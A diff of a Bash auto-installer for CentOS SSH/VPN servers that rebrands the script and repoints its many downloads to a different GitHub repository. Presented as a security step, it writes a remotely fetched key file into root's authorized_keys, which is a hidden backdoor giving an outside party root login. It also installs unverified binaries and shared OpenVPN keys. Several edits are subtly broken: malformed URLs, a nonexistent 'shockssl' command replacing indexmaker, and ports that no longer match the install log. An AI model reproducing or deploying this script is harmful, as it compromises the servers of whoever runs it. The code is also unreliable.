@@ -1,6 +1,6 @@
 #!/bin/bash
-# Script Auto Installer by Indoworx
-# www.indoworx.com
+# Script Auto Installer by ZhangZi
+# https://shockssl.com
 # initialisasi var
 OS=`uname -p`;
 
@@ -58,10 +58,10 @@ rpm -Uvh epel-release-6-8.noarch.rpm
 rpm -Uvh remi-release-6.rpm
 
 if [ "$OS" == "x86_64" ]; then
-  wget https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/app/rpmforge.rpm
+  wget https://raw.githubusercontent.com/emue25/centos/zhangzi/rpmforge.rpm
   rpm -Uvh rpmforge.rpm
 else
-  wget https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/app/rpmforge.rpm
+  wget https://raw.githubusercontent.com/emue25/centos/zhangzi/rpmforge.rpm
   rpm -Uvh rpmforge.rpm
 fi
 
@@ -80,7 +80,7 @@ yum -y update
 # Untuk keamanan server
 cd
 mkdir /root/.ssh
-wget https://github.com/khairilg/script-jualan-ssh-vpn/raw/master/conf/ak -O /root/.ssh/authorized_keys
+wget https://github.com/emue25/centos/zhangzi/conf/ak -O /root/.ssh/authorized_keys
 chmod 700 /root/.ssh
 chmod 600 /root/.ssh/authorized_keys
 echo "AuthorizedKeysFile     .ssh/authorized_keys" >> /etc/ssh/sshd_config
@@ -115,7 +115,7 @@ chkconfig vnstat on
 
 # install screenfetch
 cd
-wget https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/app/screenfetch-dev
+wget https://raw.githubusercontent.com/emue25/centos/zhangzi/screenfetch-dev
 mv screenfetch-dev /usr/bin/screenfetch
 chmod +x /usr/bin/screenfetch
 echo "clear" >> .bash_profile
@@ -123,27 +123,27 @@ echo "screenfetch" >> .bash_profile
 
 # install webserver
 cd
-wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/nginx.conf"
+wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/emue25/centos/zhangzi/nginx.conf"
 sed -i 's/www-data/nginx/g' /etc/nginx/nginx.conf
 mkdir -p /home/vps/public_html
 echo "<pre>Setup by Khairil G</pre>" > /home/vps/public_html/index.html
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
 rm /etc/nginx/conf.d/*
-wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/vps.conf"
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/emue25/centos/zhangzi/vps.conf"
 sed -i 's/apache/nginx/g' /etc/php-fpm.d/www.conf
 chmod -R +rx /home/vps
 service php-fpm restart
 service nginx restart
 
 # install openvpn
-wget -O /etc/openvpn/openvpn.zip "https://github.com/khairilg/script-jualan-ssh-vpn/raw/master/conf/openvpn-key.zip"
+wget -O /etc/openvpn/openvpn.zip "https://github.com/emue25/centos/zhangzi/raw/openvpn-key.zip"
 cd /etc/openvpn/
 unzip openvpn.zip
-wget -O /etc/openvpn/1194.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/1194-centos.conf"
+wget -O /etc/openvpn/1194.conf "https://raw.githubusercontent.com/emue25/centos/zhangzi/1194-centos.conf"
 if [ "$OS" == "x86_64" ]; then
-  wget -O /etc/openvpn/1194.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/1194-centos64.conf"
+  wget -O /etc/openvpn/1194.conf "https://raw.githubusercontent.com/emue25/centos/zhangzi/1194-centos64.conf"
 fi
-wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/iptables.up.rules"
+wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/emue25/centos/zhangzi/iptables.up.rules"
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
 sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.d/rc.local
 MYIP=`curl icanhazip.com`;
@@ -159,7 +159,7 @@ cd
 
 # configure openvpn client config
 cd /etc/openvpn/
-wget -O /etc/openvpn/client.ovpn "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/openvpn.conf"
+wget -O /etc/openvpn/client.ovpn "https://raw.githubusercontent.com/emue25/centos/zhangzi/openvpn.conf"
 sed -i $MYIP2 /etc/openvpn/client.ovpn;
 #PASS=`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 15 | head -n 1`;
 useradd -g 0 -d /root/ -s /bin/bash $dname
@@ -172,29 +172,29 @@ cp client.ovpn /home/vps/public_html/
 
 # install badvpn
 cd
-wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/badvpn-udpgw"
+wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/emue25/centos/zhangzi/badvpn-udpgw"
 if [ "$OS" == "x86_64" ]; then
-  wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/badvpn-udpgw64"
+  wget -O /usr/bin/badvpn-udpgw "https://raw.githubusercontent.com/emue25/centos/zhangzi/badvpn-udpgw64"
 fi
 sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.local
-sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300' /etc/rc.d/rc.local
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200' /etc/rc.d/rc.local
 chmod +x /usr/bin/badvpn-udpgw
-screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200
 
 # install mrtg
 cd /etc/snmp/
-wget -O /etc/snmp/snmpd.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/snmpd.conf"
-wget -O /root/mrtg-mem.sh "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/mrtg-mem.sh"
+wget -O /etc/snmp/snmpd.conf "https://raw.githubusercontent.com/emue25/centos/zhangzi/snmpd.conf"
+wget -O /root/mrtg-mem.sh "https://raw.githubusercontent.com/emue25/centos/zhangzi/mrtg-mem.sh"
 chmod +x /root/mrtg-mem.sh
 service snmpd restart
 chkconfig snmpd on
 snmpwalk -v 1 -c public localhost | tail
 mkdir -p /home/vps/public_html/mrtg
 cfgmaker --zero-speed 100000000 --global 'WorkDir: /home/vps/public_html/mrtg' --output /etc/mrtg/mrtg.cfg public@localhost
-curl "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/mrtg.conf" >> /etc/mrtg/mrtg.cfg
+curl "https://raw.githubusercontent.com/emue25/centos/zhangzi/mrtg.conf" >> /etc/mrtg/mrtg.cfg
 sed -i 's/WorkDir: \/var\/www\/mrtg/# WorkDir: \/var\/www\/mrtg/g' /etc/mrtg/mrtg.cfg
 sed -i 's/# Options\[_\]: growright, bits/Options\[_\]: growright/g' /etc/mrtg/mrtg.cfg
-indexmaker --output=/home/vps/public_html/mrtg/index.html /etc/mrtg/mrtg.cfg
+shockssl --output=/home/vps/public_html/mrtg/index.html /etc/mrtg/mrtg.cfg
 echo "0-59/5 * * * * root env LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg" > /etc/cron.d/mrtg
 LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg
 LANG=C /usr/bin/mrtg /etc/mrtg/mrtg.cfg
@@ -209,7 +209,7 @@ chkconfig sshd on
 
 # install dropbear
 yum -y install dropbear
-echo "OPTIONS=\"-p 80 -p 109 -p 110 -p 443 -b /etc/pesan\"" > /etc/sysconfig/dropbear
+echo "OPTIONS=\"-p 80 -p 109 -p 110 -p 442 -b /etc/pesan\"" > /etc/sysconfig/dropbear
 echo "/bin/false" >> /etc/shells
 echo "PIDFILE=/var/run/dropbear.pid" >> /etc/init.d/dropbear
 service dropbear restart
@@ -217,7 +217,7 @@ chkconfig dropbear on
 
 # install vnstat gui
 cd /home/vps/public_html/
-wget https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/app/vnstat_php_frontend-1.5.1.tar.gz
+wget https://raw.githubusercontent.com/emue25/centos/zhangzi/vnstat_php_frontend-1.5.1.tar.gz
 tar xf vnstat_php_frontend-1.5.1.tar.gz
 rm vnstat_php_frontend-1.5.1.tar.gz
 mv vnstat_php_frontend-1.5.1 vnstat
@@ -235,14 +235,14 @@ chkconfig fail2ban on
 
 # install squid
 yum -y install squid
-wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/squid-centos.conf"
+wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/emue25/centos/zhangzi/squid-centos.conf"
 sed -i $MYIP2 /etc/squid/squid.conf;
 service squid restart
 chkconfig squid on
 
 # install webmin
 cd
-wget http://prdownloads.sourceforge.net/webadmin/webmin-1.831-1.noarch.rpm
+wget http://prdownloads.sourceforge.net/webadmin/webmin-1.930-1.noarch.rpm
 yum -y install perl perl-Net-SSLeay openssl perl-IO-Tty
 rpm -U webmin*
 rm -f webmin*
@@ -252,9 +252,9 @@ chkconfig webmin on
 
 # pasang bmon
 if [ "$OS" == "x86_64" ]; then
-  wget -O /usr/bin/bmon "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/bmon64"
+  wget -O /usr/bin/bmon "https://raw.githubusercontent.com/emue25/centos/zhangzi/bmon64"
 else
-  wget -O /usr/bin/bmon "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/conf/bmon"
+  wget -O /usr/bin/bmon "https://raw.githubusercontent.com/emue25/centos/zhangzi/bmon"
 fi
 chmod +x /usr/bin/bmon
 
@@ -267,26 +267,26 @@ chmod +x /usr/bin/bmon
 
 # downlaod script
 cd /usr/bin
-wget -O speedtest "https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py"
-wget -O bench "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/bench-network.sh"
-wget -O mem "https://raw.githubusercontent.com/pixelb/ps_mem/master/ps_mem.py"
-wget -O userlogin "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/user-login.sh"
-wget -O userexpire "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/autoexpire.sh"
-wget -O usernew "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/create-user.sh"
-wget -O userdelete "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/user-delete.sh"
-wget -O userlimit "https://github.com/khairilg/script-jualan-ssh-vpn/raw/master/user-limit.sh"
-wget -O renew "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/user-renew.sh"
-wget -O userlist "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/user-list.sh" 
-wget -O trial "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/user-trial.sh"
+wget -O speedtest "https://raw.githubusercontent.com/emue25/centoz/zhangzi/menu/speedtest.py"
+wget -O bench "https://raw.githubusercontent.com/emue25/centoz/zhangzi/menu/bench-network.sh"
+wget -O mem "https://raw.githubusercontent.com/emue25/centoz/zhangzi/menu/ps_mem.py"
+wget -O userlogin "https://raw.githubusercontent.com/emue25/centoz/zhangzi/menu/user-login.sh"
+wget -O userexpire "https://raw.githubusercontent.com/emue25/centoz/zhangzi/menu/autoexpire.sh"
+wget -O usernew "https://raw.githubusercontent.com/emue25/centoz/zhangzi/menu/create-user.sh"
+wget -O userdelete "https://raw.githubusercontent.com/emue25/centoz/zhangzi/menu/user-delete.sh"
+wget -O userlimit "https://github.com/emue25/centoz/zhangzi/menu/user-limit.sh"
+wget -O renew "https://raw.githubusercontent.com/emue25/centoz/zhangzi/menu/user-renew.sh"
+wget -O userlist "https://raw.githubusercontent.com/emue25/centoz/zhangzi/menu/user-list.sh" 
+wget -O trial "https://raw.githubusercontent.com/khairilg/emue25/centoz/zhangzi/menu/user-trial.sh"
 echo "cat /root/log-install.txt" | tee info
 echo "speedtest --share" | tee speedtest
 wget -O /root/chkrootkit.tar.gz ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz
 tar zxf /root/chkrootkit.tar.gz -C /root/
 rm -f /root/chkrootkit.tar.gz
 mv /root/chk* /root/chkrootkit
-wget -O checkvirus "https://github.com/khairilg/script-jualan-ssh-vpn/raw/master/checkvirus.sh"
-#wget -O cron-autokill "https://raw.githubusercontent.com/khairilg/script-jualan-ssh-vpn/master/cron-autokill.sh"
-wget -O cron-dropcheck "https://github.com/khairilg/script-jualan-ssh-vpn/raw/master/cron-dropcheck.sh"
+wget -O checkvirus "https://github.com/emue25/centos/zhangzi/menu/checkvirus.sh"
+#wget -O cron-autokill "https://raw.githubusercontent.com/emue25/centoz/zhangzi/menu/cron-autokill.sh"
+wget -O cron-dropcheck "https://github.com/emue25/centoz/zhangzi/menu/cron-dropcheck.sh"
 
 # sett permission
 chmod +x userlogin
@@ -338,9 +338,9 @@ chkconfig crond on
 # info
 echo "Layanan yang diaktifkan"  | tee -a log-install.txt
 echo "--------------------------------------"  | tee -a log-install.txt
-echo "OpenVPN : TCP 1194 (client config : http://$MYIP:81/client.ovpn)"  | tee -a log-install.txt
+echo "OpenVPN : TCP 443 (client config : http://$MYIP:81/client.ovpn)"  | tee -a log-install.txt
 echo "Port OpenSSH : 22, 143"  | tee -a log-install.txt
-echo "Port Dropbear : 80, 109, 110, 443"  | tee -a log-install.txt
+echo "Port Dropbear : 80, 109, 110, 442"  | tee -a log-install.txt
 echo "SquidProxy    : 8080, 8888, 3128 (limit to IP SSH)"  | tee -a log-install.txt
 echo "Nginx : 81"  | tee -a log-install.txt
 echo "badvpn   : badvpn-udpgw port 7300"  | tee -a log-install.txt
